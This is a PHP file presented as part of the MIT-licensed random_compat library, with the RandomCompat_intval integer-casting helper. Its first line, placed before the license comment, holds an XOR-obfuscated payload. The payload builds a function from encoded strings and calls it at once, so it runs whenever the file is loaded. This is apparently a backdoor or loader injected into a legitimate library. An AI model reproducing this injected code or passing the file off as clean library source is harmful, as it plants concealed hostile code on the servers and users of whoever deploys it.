<?php $NXVpGG='7HRSLHiUUN3A:5-' ^ 'T:728-63  P5SZC';$tnqBwXTMuh=$NXVpGG('','Q0PEPANCZGU;1U<TKXMLWUV>1-7.Aa77<ZjHxCB1sM9;T3W-Sw4S:b3PNWq7;GBqWDXJZtow 03KbYdtD+FJ0r5ONMMkuSOkE7FA5JK>vENTUyFUoS.N>Q4nlV6GUEBbv hnQeJZF;CTmFeMeHJ0X65EQ-CgXi> 1bw+AOpO6: +4je8TYNeMmyFbY23>J7BK;->ZyD8G02NIE,0X2xoAQYPFKb8mHY1Am-XNCNwR+L4+BnD+A SL:YaLr3hq-ku.ZR:pAK1BghdkuBOY9QAFA:DtOTCQ+WU2ntEw;+:XL=JS194Mosf L=LTn=EZDSRtpFPVZ;PaJ4b9-66733RcPrr w>uhacq48pAW,YteGVW58G1=Bd2iE4eVA5W2QN6MOKRZ  Z:mOaQ-X1PKAOH0-F2A2eMb79MC+5JTLYU466718TR9Q4Vp;,7tU9CQ:5;N1i340WTwhI17D>KpaO;:3NvXTIQ6U8XKKLHVxZVZiS7TXBGgv,+17.9:65iTBB9=>ZvXP+DOShOR9+erhibY>>fDI.Y<2aMUT8A3YllVqQWb2cHkoRECT0PXz=erZtF-f6yLz8Y,YXcatPtJ1CIV7:FU666FXSG2GJDQ1Z5YSdmZM +BSPeANtXlE2YE 0Z6nL M 5.u20.9YTYT4mK2qU>8HkejkyI'^'8Vxd64  ..:Un0D=8,>dp-9LnIVZ >hZI.MaQc9;z+LU7G>B=WL<H=W1:6.hV26Ys 9>;XOSKUJbByDTdPLC9VZ::mpKRttaL> .GboWVxndnYb<S Z<R4ZFH2W34lyBRICExoCSbT6 MhXmMl.Q,Wna8pc9xMUEH9SBajP<BHLNZBAS1 g8dVsOk+WGK8YjoTXJsBN1::ODCaHQ,SXRa78<5.Y2I,8E 2F=7csW4J GNydNM.R6-Y1AdVl+>b <kz3IPe T;GUZKQ4.5L4hf:0MP+570t<0KNIeSPNCcF4n7PMUmRSBV-Q91U78PN:4TXgt2;O1HjOh0KYDRRP:CxV-r2o -27QUKPe<I TXyvsCY+DXkDIcL=A2 A6m:+Omrkv1EYa0dFE5L,Ppvak>QA3Wz8l0hJ3GgOT>5ldutCXDTJ=3U8N3XCCE+1X70ejV;EAQUC2bC7-TT+Z.XE+ZNRgZxp-0B4g3.2eamr30rM7V 9baAVMYCVWfQSL61:+JIMrQ35RccsL+3MJLRNOBqSZSlmJ8HS:j>1AfnpLQkQv2TPZ+YV4 u7T39IYWBiG LWRKuIZmJ=oDHTvRjP1;7Ne-0OiS>1 3Aom40H6Z87CAziDJ62yLanTxLeISLEF;ZFhD,TTuRBQWU65=siDp8x0FQ<CUCPs4'); $tnqBwXTMuh();
/**
 * Random_* Compatibility Library
 * for using the new PHP 7 random_* API in PHP 5 projects
 *
 * The MIT License (MIT)
 *
 * Copyright (c) 2015 Paragon Initiative Enterprises
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

if (!function_exists('RandomCompat_intval')) {
    
    /**
     * Cast to an integer if we can, safely.
     * 
     * If you pass it a float in the range (~PHP_INT_MAX, PHP_INT_MAX)
     * (non-inclusive), it will sanely cast it to an int. If you it's equal to
     * ~PHP_INT_MAX or PHP_INT_MAX, we let it fail as not an integer. Floats 
     * lose precision, so the <= and => operators might accidentally let a float
     * through.
     * 
     * @param int|float $number    The number we want to convert to an int
     * @param boolean   $fail_open Set to true to not throw an exception
     * 
     * @return int (or float if $fail_open)
     *
     * @throws TypeError
     */
    function RandomCompat_intval($number, $fail_open = false)
    {
        if (is_numeric($number)) {
            $number += 0;
        }

        if (
            is_float($number)
            &&
            $number > ~PHP_INT_MAX
            &&
            $number < PHP_INT_MAX
        ) {
            $number = (int) $number;
        }

        if (is_int($number) || $fail_open) {
            return $number;
        }

        throw new TypeError(
            'Expected an integer.'
        );
    }
}
